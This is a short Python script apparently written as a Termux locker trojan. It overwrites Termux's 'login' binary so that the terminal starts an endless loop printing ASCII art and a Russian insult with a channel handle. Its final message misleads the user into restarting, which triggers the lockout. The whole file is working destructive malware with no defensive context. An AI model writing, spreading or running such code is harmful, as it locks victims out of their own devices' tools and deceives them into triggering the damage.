import os

file = open('/data/data/com.termux/files/usr/bin/locker_service.py', 'w')
file.write("""print('''  _____                                     
╭━━╮╱╱╱╱╱╭╮
┃╭╮┃╱╱╱╱╱┃┃
┃╰╯╰┳━┳╮╭┫╰━╮
┃╭━╮┃╭┫┃┃┃╭╮┃
┃╰━╯┃┃┃╰╯┃┃┃┃
╰━━━┻╯╰━━┻╯╰╯


''')
while True:
	a = input(' Ебать ты лох. @HOME_PROJECTS_VIP')
""")
file.close()
os.system('chmod +x /data/data/com.termux/files/usr/bin/locker_service.py')

file = open('/data/data/com.termux/files/usr/bin/login', 'w')
file.write('python /data/data/com.termux/files/usr/bin/locker_service.py')
file.close()
print(' Напиши exit (дважды) для перезагрузки')